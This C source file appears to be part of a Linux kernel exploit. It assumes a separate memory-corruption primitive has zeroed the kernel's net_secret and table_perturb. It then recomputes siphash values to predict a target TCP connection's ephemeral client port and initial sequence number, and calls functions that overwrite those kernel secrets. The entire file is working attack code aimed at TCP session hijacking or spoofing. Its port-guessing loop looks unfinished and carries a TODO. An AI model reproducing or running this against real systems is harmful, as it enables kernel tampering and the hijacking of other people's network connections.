#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <bits/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "libprimitive.h"
#include "jiffies.h"
#include "siphash.h"

#define SERVER_IP     "10.0.0.2"
#define SERVER_PORT   80
#define CLIENT_IP     "192.168.1.2"

/* Definitions for guessing ephemeral port */
#define EPHEMERAL_PORT_SHUFFLE_PERIOD (10 * HZ)
#define JIFFY_SKEW_RANGE  (100*HZ)

/* table_perturb size */
#define CONFIG_INET_TABLE_PERTURB_ORDER 16
#define INET_TABLE_PERTURB_SIZE (1 << CONFIG_INET_TABLE_PERTURB_ORDER)

/* We assume that we zap net_secret to {0, 0} */
static const siphash_key_t net_secret_dummy = {0};

#define handle_error(msg) \
  do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define PROC_FILE "/proc/sys/net/ipv4/ip_local_port_range"
#define MAX_LINE_LENGTH 256

static void get_local_port_range(int *low, int *high)
{
    FILE *fp;
    char line[MAX_LINE_LENGTH];

    /* Open proc file */
    if ((fp = fopen(PROC_FILE, "r")) == NULL)
      handle_error("fopen(/proc/sys/net/ipv4/ip_local_port_range)");

    /* Scan the proc file for the low and high port values */
    if (fgets(line, sizeof(line), fp) != NULL) {
        if (sscanf(line, "%d %d", low, high) == 2) {
            printf("[+] Local port range (IPv4): %d -- %d\n", *low, *high);
        } else {
            fclose(fp);
            fprintf(stderr, "[!] Error parsing content of %s\n", PROC_FILE);
            exit(EXIT_FAILURE);
        }
    } else {
        fclose(fp);
        handle_error("fgets()");
    }

    /* Cleanup */
    fclose(fp);
}

static inline u64 get_real_ns(void)
{
  struct timespec ts;
  u64 ns;

  /* Get a timestamp */
  if (clock_gettime(CLOCK_REALTIME, &ts) == -1)
    handle_error("clock_gettime(CLOCK_REALTIME)");

  /* Convert it to nanseconds */
  ns = ts.tv_sec * 1000000000LL + ts.tv_nsec;

  /* Return it! */
  return ns;
}

int main(void)
{
  in_port_t server_port;
  struct in_addr server_addr;
  struct in_addr client_addr;
  int rv;
  int low, high;
  int local_ports;
  u64 port_offset;
  u32 remaining;
  u32 offset;
  int step;
  int port_guess;
  unsigned long long jiffies;
  u64 ns_timestamp;
  int i;
  u32 seq_hash;
  u32 seq_guess;

  /* Convert IP address strings from text to binary form */
  rv = inet_pton(AF_INET, SERVER_IP, &server_addr);
  if (rv == 0) {
    fprintf(stderr, "[!] inet_pton src is invalid!\n");
    exit(EXIT_FAILURE);
  } else if (rv == -1) {
    perror("inet_pton()");
    exit(EXIT_FAILURE);
  }
  rv = inet_pton(AF_INET, CLIENT_IP, &client_addr);
  if (rv == 0) {
    fprintf(stderr, "[!] inet_pton src is invalid!\n");
    exit(EXIT_FAILURE);
  } else if (rv == -1) {
    perror("inet_pton()");
    exit(EXIT_FAILURE);
  }

  /* Convert destination (server) port to network byte order */
  server_port = htons(SERVER_PORT);

  /*
   * Guess the client port
   */

  /* local_ports is 0x0 (false) according to gdb */
  local_ports = 0;

  /* Before diving into things, get the local port ranges and related stuff */
  get_local_port_range(&low, &high);
  high++; /* [32768, 60999] -> [32768, 61000[ */
  remaining = high - low;
  if (!local_ports && remaining > 1)
    remaining &= ~1U;

  /* Get the port step */
  step = local_ports ? 1 : 2;

  /* Get the jiffies */
  jiffies = estimate_jiffies();

  /* Get the port offset */
  port_offset = siphash_4u32((u32)client_addr.s_addr,
                            (u32)server_addr.s_addr,
                            (u16)server_port,
                            jiffies / EPHEMERAL_PORT_SHUFFLE_PERIOD,
                            &net_secret_dummy);
  offset = /* table_perturb[index] = */ 0 + (port_offset >> 32);
  offset %= remaining;

  if (!local_ports)
    offset &= ~1U;

  /* Follow some other logic from the kernel to come up with our guess */
  port_guess = low + offset;

  for (i = 0; i < remaining; i += step, port_guess += step) {
    if (port_guess >= high)
      port_guess -= remaining;
    /*
     * TODO: check if port is reserved and then skip if it is.
     *       For now, just assume the port is not reserved.
     */
  }

  /* Verbose */
  printf("[+] Guessed client port: %u (%#x)\n", port_guess, port_guess);

  /* Now we guess the sequence number! */
  seq_hash = (u32)siphash_3u32((u32)client_addr.s_addr,
                               (u32)server_addr.s_addr,
                               (u32)htons(port_guess) << 16 | (u32)server_port,
                               &net_secret_dummy);

  /* Get a ns timestamp and guess the sequence number */
  ns_timestamp = get_real_ns();
  seq_guess = seq_hash + (u32)((ns_timestamp >> 6));

  /* Verbose */
  printf("[+] Guessed ISN: %u (%#x)\n", seq_guess, seq_guess);

  /* Zap table_perturb */
  trigger_overwrite_of_table_perturb();

  /* Zap net_secret */
  trigger_overwrite_of_net_secret();

  /* Success! */
  return EXIT_SUCCESS;
}
